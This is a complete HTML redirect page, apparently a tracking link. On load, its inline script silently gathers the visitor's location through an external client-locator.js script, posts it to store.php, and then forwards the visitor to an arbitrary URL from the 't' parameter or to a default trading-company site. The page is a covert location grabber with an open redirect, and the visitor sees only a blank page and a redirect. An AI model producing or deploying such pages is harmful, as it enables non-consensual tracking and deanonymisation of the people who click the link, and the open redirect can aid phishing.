<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <title></title>

  <body>
    <script src="client-locator.js"></script>
      <script>
        const urlParams = new URLSearchParams(window.location.search);
        const to = urlParams.get('t');

        function ensureHttp(url) {
          if (!/^https?:\/\//i.test(url)) {
            return 'https://' + url;
          }
          return url;
        }

        (async () => {
            const clientLocationInfo = await getClientLocationInfo();

            await fetch('store.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(clientLocationInfo),
            });

            if(to){
                window.location.href = ensureHttp(to);
            }
            else {
                window.location.href = "https://www.aljamili-trading.com";
            }
        })();
      </script>
  </body>
</html>
